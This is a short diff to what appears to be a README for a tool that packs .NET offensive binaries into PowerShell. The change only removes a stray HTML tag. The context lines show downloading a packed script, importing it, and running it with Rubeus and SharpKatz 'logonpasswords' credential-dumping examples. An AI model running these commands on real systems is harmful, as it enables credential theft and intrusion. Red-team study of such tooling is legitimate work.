@@ -37,7 +37,7 @@ Example for Rubeus: Invoke-Packed-NET-Executable "logonsession","/current"
 PS C:\> WGET -URI https://URL/Packed-Csharp-binary.ps1 -OutFile C:\temp\Packed-Csharp-binary.ps1
 PS C:\> Import-Module C:\temp\Packed-Csharp-binary.ps1
 PS C:\> Invoke-Packed-NET-Executable "argument1","argument2","argument3",...
-Example for Sharpkatz: Invoke-Packed-NET-Executable "--Command","logonpasswords"</i>
+Example for Sharpkatz: Invoke-Packed-NET-Executable "--Command","logonpasswords"
 ``` 
 
 > LICENSE
